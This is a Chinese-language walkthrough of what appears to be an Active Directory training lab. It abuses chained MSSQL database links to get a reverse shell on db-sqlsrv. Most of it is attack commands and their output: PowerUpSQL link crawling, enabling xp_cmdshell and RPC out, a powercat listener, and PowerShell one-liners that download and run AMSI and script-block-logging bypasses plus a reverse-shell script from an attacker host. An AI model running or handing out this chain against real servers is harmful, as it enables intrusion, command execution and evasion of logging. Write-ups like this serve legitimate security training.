Task
•  Get a reverse shell on a db-sqlsrv in db.local forest by abusing database links from us-mssql.

1. 枚举当前账号是否有任何可用的mssql链接

```
PS C:\Windows\system32> cd C:\ad\Tools\
PS C:\ad\Tools> Import-Module .\PowerupSQL-master\PowerupSQL.psd1
WARNING: The names of some imported commands from the module 'PowerupSQL' include unapproved verbs that might make them
 less discoverable. To find the commands with unapproved verbs, run the Import-Module command again with the Verbose
parameter. For a list of approved verbs, type Get-Verb.
PS C:\ad\Tools> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
VERBOSE: us-mssql.us.techcorp.local : Connection Success.


ComputerName           : us-mssql.us.techcorp.local
Instance               : US-MSSQL
DomainName             : US
ServiceProcessID       : 2216
ServiceName            : MSSQLSERVER
ServiceAccount         : US\dbservice
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 14.0.1000.169
SQLServerMajorVersion  : 2017
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : US\studentuser138
IsSysadmin             : No
ActiveSessions         : 1
```

对us-mssql这个实例有进入权限，但我们不是sysadmin（IsSysadmin:No）

2. 查看上面us-mssql这个链接的信息

```
PS C:\ad\Tools> Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
VERBOSE: us-mssql.us.techcorp.local : Connection Success.


ComputerName           : us-mssql.us.techcorp.local
Instance               : us-mssql.us.techcorp.local
DatabaseLinkId         : 0
DatabaseLinkName       : US-MSSQL
DatabaseLinkLocation   : Local
Product                : SQL Server
Provider               : SQLNCLI
Catalog                :
LocalLogin             :
RemoteLoginName        :
is_rpc_out_enabled     : True
is_data_access_enabled : False
modify_date            : 7/7/2019 9:48:29 AM

ComputerName           : us-mssql.us.techcorp.local
Instance               : us-mssql.us.techcorp.local
DatabaseLinkId         : 1
DatabaseLinkName       : 192.168.23.25
DatabaseLinkLocation   : Remote
Product                : SQL Server
Provider               : SQLNCLI
Catalog                :
LocalLogin             :
RemoteLoginName        :
is_rpc_out_enabled     : False
is_data_access_enabled : True
modify_date            : 7/9/2019 6:54:54 AM
```

留意第二条枚举信息
```
DatabaseLinkName       : 192.168.23.25
DatabaseLinkLocation   : Remote
Product                : SQL Server
```

这里表示在us-mssql还有一个远程的mssql链接

3. 使用HeidiSQL客户端

以当前用户身份登录


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1667866844266.png)


查找当前链接下的链接,效果如上面第2步

```
select * from master..sysservers
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1667866940423.png)

继续枚举192.168.23.25这个链接下面的链接

```
select * from openquery("192.168.23.25",'select * from master..sysservers')
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1667867153821.png)

openquery可以嵌套操作，根据当前链接，打开db-sqlsrv链接，枚举版本号
```
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1667867292305.png)

我们还可以使用 PowerUpSQL 中的 Get-SQLServerLinkCrawl 来自动爬取数据库链接：

```
PS C:\ad\Tools> Get-SQLServerLinkCrawl -Instance us-mssql -Verbose

Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser138
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :
```

从上面枚举结果可知，对DB-SQLSRV有sa权限

如果启用了 xp_cmdshell（或者 rpcout 值为true，允许我们启用 xp_cmdshell），则可以使用以下命令在数据库链接中的任何节点上执行命令。

尝试对各个mssql节点执行```whoami```命令

```
PS C:\ad\Tools> Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''


Version     : SQL Server 2017
Instance    : US-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {US-MSSQL}
User        : US\studentuser138
Links       : {192.168.23.25}

Version     : SQL Server 2017
Instance    : DB-SQLPROD
CustomQuery : {nt service\mssqlserver, }   #留意这里
Path        : {US-MSSQL, 192.168.23.25}
User        : dbuser
Links       : {DB-SQLSRV}

Version     : SQL Server 2017
Instance    : DB-SQLSRV
CustomQuery :
Sysadmin    : 1
Path        : {US-MSSQL, 192.168.23.25, DB-SQLSRV}
User        : sa
Links       :
```

上面结果表明我们对 DB-SQLPROD这个实例可以执行系统命令


下面在本地开启一个监听
```
PS C:\ad\Tools> . .\powercat.ps1
PS C:\ad\Tools> powercat -l -v -p 443 -t 1000
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
```

开启一个http服务
```
PS C:\ad\Tools> python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

对该实例执行一条命令，返回一个rev shell

```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/Invoke-PowerShellTcpEx.ps1)"'''
```

获得一个rev shell


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1667868683031.png)


因为从 DB-SQLProd到DB-SQLSrv的链接是sa权限，我们可以在 DB-SQLSrv 上启用 RPC Out 和 xp_cmdshell，在上面拿到的rev shell下操作,忽略第一条命令的报错
```
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"

Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"

Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""

Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1667869029838.png)

上面操作完成以后，现在再次对执行whoami,已经可以在DB-SQLSRV执行系统命令

```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1667869162364.png)


现在可以对DB-SQLSRV拿到一个rev shell

在HeidiSQL上操作
```
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell ''''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/Invoke-PowerShellTcp.ps1)"'''''')')
```

注意这里使用的是，需要在脚本最后面加
```
reverse -Reverse -IPAddress 192.168.100.138 -Port 443
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1667869606504.png)

或者可以在命令行里执行rev shell

```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1667869785882.png)